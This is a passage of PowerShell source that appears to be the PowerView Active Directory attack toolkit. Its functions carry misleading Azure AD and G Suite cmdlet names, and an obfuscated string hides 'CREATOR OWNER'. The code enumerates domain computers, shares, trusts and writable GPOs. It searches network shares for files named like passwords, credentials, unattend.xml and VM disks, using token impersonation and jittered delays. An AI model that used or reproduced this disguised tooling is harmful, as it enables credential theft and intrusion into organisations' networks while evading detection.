        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $officedocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $freshexes,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $excludefolders,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $excludehidden,
        [Switch]
        $checkwriteaccess,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $searcherarguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            
            $lastaccesstime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $mappedcomputers = @{}
        function export-psgsuiteconfiguration {
            
            [CmdletBinding()]Param([String]$path)
            try {
                $filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $hostcomputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    
                    get-azureaduserextension -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }
            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                
                $continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (export-psgsuiteconfiguration -Path $_.FullName))) {
                    $continue = $False
                }
                if ($Continue) {
                    $fileparams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $foundfile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }
    END {
        
        $MappedComputers.Keys | get-azureaddirectoryroletemplate
    }
}
function new-azureadapplicationkeycredential {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $computername,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $computerdomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $computerldapfilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $computersearchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $computeroperatingsystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $computerservicepack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $computersitename,
        [Alias('CheckAccess')]
        [Switch]
        $checkshareaccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $threads = 20
    )
    BEGIN {
        $computersearcherarguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['ComputerName']) {
            $targetcomputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $targetcomputers = get-gscalendarresourcelist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }
        
        $hostenumblock = {
            Param($computername, $checkshareaccess, $tokenhandle)
            if ($TokenHandle) {
                
                $null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    $shares = get-azureaddomainverificationdnsrecord -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $sharename = $Share.Name
                        
                        $path = '\\'+$TargetComputer+'\'+$ShareName
                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            
                            if ($CheckShareAccess) {
                                
                                try {
                                    $null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $logontoken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $logontoken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $logontoken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            $counter = 0
            $randno = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $counter = $Counter + 1
                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"
            
            $scriptparams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }
            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function set-azureaduser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $computername,
        [ValidateNotNullOrEmpty()]
        [String]
        $computerdomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $computerldapfilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $computersearchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $computeroperatingsystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $computerservicepack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $computersitename,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $sharepath,
        [String[]]
        $excludedshares = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $lastaccesstime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $lastwritetime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $creationtime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $officedocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $freshexes,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $threads = 20
    )
    BEGIN {
        $computersearcherarguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['ComputerName']) {
            $targetcomputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $targetcomputers = get-gscalendarresourcelist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }
        
        $hostenumblock = {
            Param($computername, $include, $excludedshares, $officedocs, $excludehidden, $freshexes, $checkwriteaccess, $tokenhandle)
            if ($TokenHandle) {
                
                $null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
            ForEach ($TargetComputer in $ComputerName) {
                $searchshares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    
                    $SearchShares += $TargetComputer
                }
                else {
                    $up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        
                        $shares = get-azureaddomainverificationdnsrecord -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $sharename = $Share.Name
                            $path = '\\'+$TargetComputer+'\'+$ShareName
                            
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                
                                if ($ExcludedShares -NotContains $ShareName) {
                                    
                                    try {
                                        $null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $SearchShares) {
                    Write-Verbose "Searching share: $Share"
                    $searchargs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs['CreationTime'] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                    }
                    get-azureaddeviceregistereduser @SearchArgs
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $logontoken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $logontoken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $logontoken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            $counter = 0
            $randno = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $counter = $Counter + 1
                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"
            
            $scriptparams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }
            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function get-gsgmailsignature {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $api,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $net,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $findone,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $trustattributes = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $ldapsearcherarguments = @{}
        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $netsearcherarguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $sourcedomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $sourcedomain = (select-azureadgroupidsuserismemberof -Credential $Credential).Name
                }
                else {
                    $sourcedomain = (select-azureadgroupidsuserismemberof).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $sourcedomain = $Domain
            }
            else {
                $sourcedomain = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            
            $trustsearcher = set-azureaddevice @LdapSearcherArguments
            $sourcesid = get-crosscloudverificationcode @NetSearcherArguments
            if ($TrustSearcher) {
                $TrustSearcher.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $results = $TrustSearcher.FindOne() }
                else { $results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $props = $_.Properties
                    $domaintrust = New-Object PSObject
                    $trustattrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }
                    $direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $trusttype = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $distinguishedname = $Props.distinguishedname[0]
                    $sourcenameindex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $sourcedomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $sourcedomain = ""
                    }
                    $targetnameindex = $Distinguishedname.IndexOf(',CN=System')
                    if ($SourceNameIndex) {
                        $targetdomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $targetdomain = ""
                    }
                    $objectguid = New-Object Guid @(,$Props.objectguid[0])
                    $targetsid = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            
            if ($PSBoundParameters['Server']) {
                $targetdc = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $targetdc = $Domain
            }
            else {
                
                $targetdc = $Null
            }
            
            $ptrinfo = [IntPtr]::Zero
            
            $flags = 63
            $domaincount = 0
            
            $result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)
            
            $offset = $PtrInfo.ToInt64()
            
            if (($Result -eq 0) -and ($Offset -gt 0)) {
                
                $increment = $DS_DOMAIN_TRUSTS::GetSize()
                
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    
                    $newintptr = New-Object System.Intptr -ArgumentList $Offset
                    $info = $NewIntPtr -as $DS_DOMAIN_TRUSTS
                    $offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $sidstring = ''
                    $result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$lasterror = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $domaintrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                
                $null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            
            $founddomain = select-azureadgroupidsuserismemberof @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function get-azureaddomainnamereference {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $netforestarguments = @{}
        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }
        $foundforest = get-azureadmsadministrativeunitmember @NetForestArguments
        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function new-azureadmsapplicationpassword {
    [CmdletBinding()]
    Param (
        [String]
        $gponame = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $pagesize = 200
    )
    $exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')
    $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $domainlist = @($Forest.Domains)
    $domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = "Subtree"
        $listgpo = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $acl = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "aednt#e #isde".replace('a', 'C').replace('#', 'O').replace('e', 'R').replace('d', 'E').replace('n', 'A').replace('t', 'T').replace('i', 'W').replace('s', 'N')}
        if ($ACL -ne $null){
            $gpoacl = New-Object psobject
            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}
$mod = set-azureadmsadministrativeunit -ModuleName Win32
$samaccounttypeenum = get-azureadtenantdetail $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$grouptypeenum = get-azureadtenantdetail $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
